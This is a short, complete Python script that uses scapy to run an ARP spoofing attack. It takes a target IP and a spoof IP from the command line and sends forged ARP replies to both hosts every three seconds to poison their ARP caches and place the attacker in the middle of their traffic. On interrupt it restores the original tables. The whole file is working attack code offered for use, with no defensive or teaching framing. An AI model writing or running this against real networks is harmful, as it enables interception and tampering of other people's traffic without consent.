import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="targetIP", help="Enter the Target IP")
    parser.add_option("-s", "--spoof-ip", dest="spoofIP", help="Enter the Spoof IP")
    values, arguments = parser.parse_args()
    if not values.targetIP:
        parser.error("[-] You forgot to enter target IP")
    if not values.spoofIP:
        parser.error("[-] You forgot to enter spoof IP")
    return values


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, restore_ip):
    target_mac = scan(target_ip)
    restore_mac = scan(restore_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=restore_ip, hwsrc=restore_mac)
    scapy.send(packet, count=4, verbose=False)


IP = get_arguments()
ip1 = IP.targetIP
ip2 = IP.spoofIP

try:
    count = 0
    print("\nARP Spoofing Started :)\n")
    while True:
        spoof(ip1, ip2)
        spoof(ip2, ip1)
        count = count + 2
        print("\rpacket count >" + str(count)),
        sys.stdout.flush()
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[-] Detected Keyboard Interrupt ! \n Restoring ARP tables Please Wait . . .")
    restore(ip1, ip2)
    restore(ip2, ip1)
    print("\n[+] Restore Done :)\n")
